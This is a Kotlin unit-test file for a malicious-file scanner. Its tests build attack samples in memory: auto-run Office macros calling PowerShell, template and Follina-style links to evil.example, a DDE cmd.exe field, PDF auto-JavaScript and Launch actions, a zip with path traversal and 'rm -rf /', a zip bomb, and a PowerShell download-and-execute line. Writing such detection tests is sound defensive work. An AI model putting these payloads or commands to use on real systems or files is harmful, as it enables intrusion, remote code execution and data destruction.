package com.safeopen.viewer

import com.safeopen.viewer.security.FileKind
import com.safeopen.viewer.security.FindingCode
import com.safeopen.viewer.security.ScanReport
import com.safeopen.viewer.security.Scanner
import com.safeopen.viewer.security.Verdict
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.zip.Deflater
import java.util.zip.DeflaterOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * Malicious samples are *built in memory* by the tests (never stored in the repository),
 * so downloading the source code never trips a desktop antivirus.
 */
class ScannerTest {

    @get:Rule val tmp = TemporaryFolder()

    private fun fixture(name: String) = File(javaClass.classLoader!!.getResource("fixtures/$name")!!.toURI())

    private fun file(name: String, bytes: ByteArray) = tmp.newFile(name).apply { writeBytes(bytes) }

    private fun zip(name: String, vararg entries: Pair<String, ByteArray>): File {
        val f = tmp.newFile(name)
        ZipOutputStream(f.outputStream()).use { z ->
            for ((n, data) in entries) { z.putNextEntry(ZipEntry(n)); z.write(data); z.closeEntry() }
        }
        return f
    }

    private fun scan(f: File, name: String = f.name) = Scanner.scan(f, name)
    private fun ScanReport.has(code: FindingCode) = findings.any { it.code == code }

    /** Minimal valid-looking PE header: "MZ" ... e_lfanew → "PE\0\0". */
    private fun fakePe(): ByteArray {
        val b = ByteArray(256)
        b[0] = 'M'.code.toByte(); b[1] = 'Z'.code.toByte()
        b[60] = 0x80.toByte()
        "PE\u0000\u0000".forEachIndexed { i, c -> b[0x80 + i] = c.code.toByte() }
        return b
    }

    private val ooxmlTypes = "<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"/>".toByteArray()

    // ------------------------------------------------------------------------------ clean ----

    @Test fun cleanOfficeFilesAreSafe() {
        for ((n, kind) in listOf("sample.docx" to FileKind.DOCX, "sample.xlsx" to FileKind.XLSX,
                "sample.pptx" to FileKind.PPTX, "sample.pdf" to FileKind.PDF, "sample.csv" to FileKind.CSV)) {
            val r = scan(fixture(n))
            assertEquals(n, kind, r.kind)
            assertEquals("$n: ${r.findings}", Verdict.SAFE, r.verdict)
            assertEquals(64, r.sha256.length)
        }
    }

    @Test fun plainTextIsSafe() {
        val r = scan(file("notes.txt", "Hello world\nمرحبا".toByteArray()))
        assertEquals(FileKind.TEXT, r.kind)
        assertEquals(Verdict.SAFE, r.verdict)
    }

    // ----------------------------------------------------------------------- executables ----

    @Test fun eicarIsDetected() {
        val eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}\$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!" + "\$H+H*"
        val r = scan(file("eicar.com", eicar.toByteArray()))
        assertTrue(r.has(FindingCode.EICAR_TEST))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun exeDisguisedAsPdf() {
        val r = scan(file("invoice.pdf", fakePe()))
        assertEquals(FileKind.EXE_WINDOWS, r.kind)
        assertTrue(r.has(FindingCode.TYPE_MISMATCH))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun doubleExtension() {
        val r = scan(file("photo.jpg.exe", fakePe()))
        assertTrue(r.has(FindingCode.DOUBLE_EXTENSION))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun rightToLeftOverrideName() {
        val r = scan(file("rtlo.bin", "hello".toByteArray()), "invoice\u202Efdp.exe")
        assertTrue(r.has(FindingCode.RTL_OVERRIDE_NAME))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun elfAndApk() {
        assertEquals(FileKind.EXE_LINUX, scan(file("x", byteArrayOf(0x7F, 'E'.code.toByte(), 'L'.code.toByte(), 'F'.code.toByte(), 2, 1))).kind)
        val apk = zip("app.apk", "AndroidManifest.xml" to ByteArray(10), "classes.dex" to "dex\n035\u0000".toByteArray())
        val r = scan(apk)
        assertEquals(FileKind.APK, r.kind)
        assertTrue(r.has(FindingCode.ANDROID_APP))
    }

    // ------------------------------------------------------------------------------ office ----

    @Test fun docmWithAutoOpenMacro() {
        val vba = "Attribute VB_Name = \"NewMacros\"\nSub AutoOpen()\n Shell \"powershell -enc AAAA\"\nEnd Sub".toByteArray()
        val f = zip("report.docm",
            "[Content_Types].xml" to ooxmlTypes,
            "word/document.xml" to "<w:document/>".toByteArray(),
            "word/vbaProject.bin" to vba)
        val r = scan(f)
        assertEquals(FileKind.DOCX, r.kind)
        assertTrue(r.has(FindingCode.VBA_MACROS))
        assertTrue(r.has(FindingCode.AUTO_EXEC_MACRO))
        assertTrue(r.has(FindingCode.MACRO_SUSPICIOUS_CALLS))
        assertTrue(r.has(FindingCode.MACRO_ENABLED_FORMAT))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun remoteTemplateInjection() {
        val rels = """<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
            <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
              Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>""".toByteArray()
        val f = zip("cv.docx", "[Content_Types].xml" to ooxmlTypes, "word/document.xml" to "<w:document/>".toByteArray(),
            "word/_rels/settings.xml.rels" to rels)
        val r = scan(f)
        assertTrue(r.has(FindingCode.EXTERNAL_TEMPLATE))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun follina() {
        val rels = """<Relationships><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
              Target="mhtml:http://evil.example/x.html!x-usc:http://evil.example/x.html" TargetMode="External"/></Relationships>""".toByteArray()
        val f = zip("doc.docx", "[Content_Types].xml" to ooxmlTypes, "word/document.xml" to "<w:document/>".toByteArray(),
            "word/_rels/document.xml.rels" to rels)
        assertTrue(scan(f).has(FindingCode.FOLLINA_MSDT))
    }

    @Test fun ddeField() {
        val doc = "<w:document><w:body><w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\"</w:instrText></w:r></w:p></w:body></w:document>"
        val f = zip("dde.docx", "[Content_Types].xml" to ooxmlTypes, "word/document.xml" to doc.toByteArray())
        assertTrue(scan(f).has(FindingCode.DDE_FIELD))
    }

    @Test fun excel4Macros() {
        val f = zip("book.xlsm", "[Content_Types].xml" to ooxmlTypes, "xl/workbook.xml" to "<workbook/>".toByteArray(),
            "xl/macrosheets/sheet1.xml" to "<xm:macrosheet/>".toByteArray())
        val r = scan(f)
        assertEquals(FileKind.XLSX, r.kind)
        assertTrue(r.has(FindingCode.XLM_MACROS))
    }

    @Test fun legacyDocWithVba() {
        val data = ByteArrayOutputStream()
        data.write(byteArrayOf(0xD0.toByte(), 0xCF.toByte(), 0x11, 0xE0.toByte(), 0xA1.toByte(), 0xB1.toByte(), 0x1A, 0xE1.toByte()))
        data.write(ByteArray(512))
        data.write("_VBA_PROJECT".toByteArray(Charsets.UTF_16LE))
        data.write("Sub Document_Open() CreateObject(\"WScript.Shell\")".toByteArray())
        val r = scan(file("old.doc", data.toByteArray()))
        assertEquals(FileKind.DOC, r.kind)
        assertTrue(r.has(FindingCode.VBA_MACROS))
        assertTrue(r.has(FindingCode.AUTO_EXEC_MACRO))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun rtfExploit() {
        val rtf = "{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 01050000020000000b0000004571756174696f6e2e33}}}"
        val r = scan(file("cv.rtf", rtf.toByteArray()))
        assertEquals(FileKind.RTF, r.kind)
        assertTrue(r.has(FindingCode.RTF_AUTO_UPDATE))
        assertTrue(r.has(FindingCode.EQUATION_EDITOR_EXPLOIT))
    }

    // -------------------------------------------------------------------------------- PDF ----

    private fun pdf(body: String) = "%PDF-1.7\n$body\n%%EOF".toByteArray(Charsets.ISO_8859_1)

    @Test fun pdfAutoJavaScript() {
        val r = scan(file("a.pdf", pdf("1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj 2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj")))
        assertTrue(r.has(FindingCode.PDF_JAVASCRIPT))
        assertTrue(r.has(FindingCode.PDF_AUTO_ACTION))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun pdfLaunch() {
        val r = scan(file("b.pdf", pdf("1 0 obj << /S /Launch /Win << /F (cmd.exe) >> >> endobj")))
        assertTrue(r.has(FindingCode.PDF_LAUNCH))
    }

    @Test fun pdfObfuscatedNames() {
        val r = scan(file("c.pdf", pdf("1 0 obj << /OpenAction << /S /J#61vaScript /JS (x) >> >> endobj")))
        assertTrue(r.has(FindingCode.PDF_OBFUSCATED_NAMES))
        assertTrue(r.has(FindingCode.PDF_AUTO_ACTION))
    }

    @Test fun pdfJavaScriptHiddenInCompressedStream() {
        val hidden = "<< /Type /Action /S /JavaScript /JS (this.exportDataObject()) >> << /AA << /O 3 0 R >> >>".toByteArray()
        val bos = ByteArrayOutputStream()
        DeflaterOutputStream(bos, Deflater()).use { it.write(hidden) }
        val head = "%PDF-1.5\n1 0 obj << /Type /ObjStm /Filter /FlateDecode /Length ${bos.size()} >>\nstream\n".toByteArray(Charsets.ISO_8859_1)
        val tail = "\nendstream\nendobj\n%%EOF".toByteArray(Charsets.ISO_8859_1)
        val r = scan(file("d.pdf", head + bos.toByteArray() + tail))
        assertTrue(r.findings.toString(), r.has(FindingCode.PDF_JAVASCRIPT))
        assertTrue(r.has(FindingCode.PDF_AUTO_ACTION))
    }

    // ---------------------------------------------------------------------------- archives ----

    @Test fun zipWithExecutableAndTraversal() {
        val f = zip("pack.zip", "readme.txt" to "hi".toByteArray(), "../../evil.sh" to "rm -rf /".toByteArray(),
            "setup.exe" to fakePe(), "docs/invoice.pdf" to fakePe())
        val r = scan(f)
        assertEquals(FileKind.ZIP, r.kind)
        assertTrue(r.has(FindingCode.ZIP_PATH_TRAVERSAL))
        assertTrue(r.has(FindingCode.NESTED_EXECUTABLE))
        assertTrue(r.findings.any { it.code == FindingCode.NESTED_EXECUTABLE && it.detail.contains("invoice.pdf") })
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }

    @Test fun zipBomb() {
        val f = tmp.newFile("bomb.zip")
        ZipOutputStream(f.outputStream()).use { z ->
            z.setLevel(9)
            z.putNextEntry(ZipEntry("zeros.bin"))
            val chunk = ByteArray(1024 * 1024)
            repeat(300) { z.write(chunk) } // 300 MB of zeros → ~300 KB compressed
            z.closeEntry()
        }
        val r = scan(f)
        assertTrue(r.findings.toString(), r.has(FindingCode.ZIP_BOMB))
    }

    // ------------------------------------------------------------------------------- web ----

    @Test fun phishingHtml() {
        val html = "<!doctype html><html><body><form action='https://x'><input type=\"password\"></form><script>eval(atob('YQ=='));document.write('x')</script></body></html>"
        val r = scan(file("login.html", html.toByteArray()))
        assertEquals(FileKind.HTML, r.kind)
        assertTrue(r.has(FindingCode.HTML_PASSWORD_FORM))
        assertEquals(Verdict.SUSPICIOUS, r.verdict)
    }

    @Test fun svgWithScript() {
        val r = scan(file("img.svg", "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>".toByteArray()))
        assertEquals(FileKind.SVG, r.kind)
        assertTrue(r.has(FindingCode.SVG_SCRIPT))
    }

    @Test fun maliciousPowershellScript() {
        val r = scan(file("run.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')".toByteArray()))
        assertTrue(r.has(FindingCode.SCRIPT_FILE))
        assertTrue(r.has(FindingCode.SUSPICIOUS_COMMANDS))
        assertEquals(Verdict.DANGEROUS, r.verdict)
    }
}
